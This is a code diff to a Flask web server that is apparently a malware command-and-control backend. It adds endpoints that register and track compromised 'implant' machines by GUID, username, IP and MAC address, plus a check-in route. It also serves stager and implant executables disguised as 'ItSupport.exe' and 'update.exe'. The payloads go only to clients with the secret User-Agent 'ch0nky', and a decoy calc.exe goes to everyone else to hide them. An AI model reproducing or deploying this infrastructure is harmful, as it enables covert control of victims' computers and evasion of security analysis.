@@ -1,12 +1,18 @@
-from flask import Flask, request, Response
+from flask import Flask, request, Response, jsonify, send_file, send_from_directory, safe_join, abort
 from flask_sqlalchemy import SQLAlchemy
 from datetime import datetime
+from dataclasses import dataclass
 import json
+import os
+import pathlib
 
-app = Flask(__name__)
+app = Flask(__name__, static_url_path='')
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///test.db'
 db = SQLAlchemy(app)
 
+app.config['EXECUTABLES'] = 'static/resources/exe/'
+
+@dataclass
 class Client(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     name = db.Column(db.String(80), unique=True, nullable=False)
@@ -15,14 +21,37 @@ class Client(db.Model):
     def __repr__(self):
         return '<Task %r>' % self.id
 
+@dataclass
 class Implant(db.Model):
+    id: int
+    guid: str
+    computerName: str
+    username: str
+    ip: str
+    mac: str
+    lastSeen: datetime
+    dateCreated: datetime
+
     id = db.Column(db.Integer, primary_key=True)
-    computerName = db.Column(db.String(80), nullable=False)
-    date_created = db.Column(db.DateTime, default=datetime.utcnow)
+    guid = db.Column(db.String(80), unique=True)
+    computerName = db.Column(db.String(80))
+    username = db.Column(db.String(80))
+    ip = db.Column(db.String(80), unique=True)
+    mac = db.Column(db.String(80), unique=True)
+    lastSeen = db.Column(db.DateTime, default=datetime.utcnow)
+    dateCreated = db.Column(db.DateTime, default=datetime.utcnow)
+
+    def __init__(self, guid, computerName, username, ip, mac):
+        self.guid = guid
+        self.computerName = computerName
+        self.username = username
+        self.ip = ip
+        self.mac = mac
 
     def __repr__(self):
-        return '<Task %r>' % self.id
+        return '<Implant %r>' % self.id
 
+@dataclass
 class Job(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     job = db.Column(db.String(80), nullable=False)
@@ -35,23 +64,68 @@ class Job(db.Model):
 
 @app.route('/')
 def index():
-    data = Implant.query.all()
-    for implant in data:
-        print(implant.id, implant.computerName, implant.date_created)
-    return Response(status=200, mimetype='application/json')
+    if(request.headers.get('User-Agent') == 'ch0nky'):
+        return jsonify(Implant.query.all())
+    else:
+        return Response(status=404, mimetype='application/json')
+
+@app.route('/ItSupport.exe')
+def stager():
+    uploads = os.path.join(app.root_path, app.config['EXECUTABLES'])
+    print(os.path.abspath(uploads))
+    if(request.headers.get('User-Agent') == 'ch0nky'):
+        try:
+            return send_from_directory(os.path.abspath(uploads), "ItSupport.exe")
+        except FileNotFoundError:
+            abort(404)
+    else:
+        try:
+            return send_from_directory(os.path.abspath(uploads), "calc.exe")
+        except FileNotFoundError:
+            abort(404)
+
+@app.route('/update.exe')
+def implant():
+    uploads = os.path.join(app.root_path, app.config['EXECUTABLES'])
+    print(os.path.abspath(uploads))
+    if(request.headers.get('User-Agent') == 'ch0nky'):
+        try:
+            return send_from_directory(os.path.abspath(uploads), "update.exe")
+        except FileNotFoundError:
+            abort(404)
+    else:
+        try:
+            return send_from_directory(os.path.abspath(uploads), "calc.exe")
+        except FileNotFoundError:
+            abort(404)
 
 @app.route('/register', methods=['POST'])
 def register():
     data = request.get_json(force=True)
-    new_instance = Implant(computerName=data['computerName'])
+    new_instance = Implant(data['guid'], data['computerName'], data['username'], data['ip'], data['mac'])
 
     try:
         db.session.add(new_instance)
         db.session.commit()
         data = Implant.query.all()
         for implant in data:
-            print(implant.id, implant.computerName, implant.date_created)
+            print(implant.id, implant.guid, implant.computerName, implant.ip, implant.mac, implant.dateCreated, implant.lastSeen)
         return Response(status=201, mimetype='application/json')
+    except:
+        return Response(status=500, mimetype='application/json')
+
+@app.route('/checkin/<int:id>', methods=['POST'])
+def checkin(id):
+    implant_to_update = Implant.query.get_or_404(id)
+    data = request.get_json(force=True)
+    implant_to_update.computerName = data['computerName']
+    implant_to_update.lastSeen = datetime.utcnow
+    try:
+        db.session.commit()
+        implants = Implant.query.all()
+        for implant in implants:
+            print(implant.id, implant.guid, implant.computerName, implant.ip, implant.mac, implant.dateCreated, implant.lastSeen)
+        return Response(status=200, mimetype='application/json')
     except:
         return Response(status=500, mimetype='application/json')
 
@@ -64,22 +138,7 @@ def delete(id):
         db.session.commit()
         implants = Implant.query.all()
         for implant in implants:
-            print(implant.id, implant.computerName, implant.date_created)
-        return Response(status=200, mimetype='application/json')
-    except:
-        return Response(status=500, mimetype='application/json')
-
-@app.route('/update/<int:id>', methods=['POST'])
-def update(id):
-    implant_to_update = Implant.query.get_or_404(id)
-    data = request.get_json(force=True)
-    implant_to_update.computerName = data['computerName']
-
-    try:
-        db.session.commit()
-        implants = Implant.query.all()
-        for implant in implants:
-            print(implant.id, implant.computerName, implant.date_created)
+            print(implant.id, implant.guid, implant.computerName, implant.ip, implant.mac, implant.dateCreated, implant.lastSeen)
         return Response(status=200, mimetype='application/json')
     except:
         return Response(status=500, mimetype='application/json')
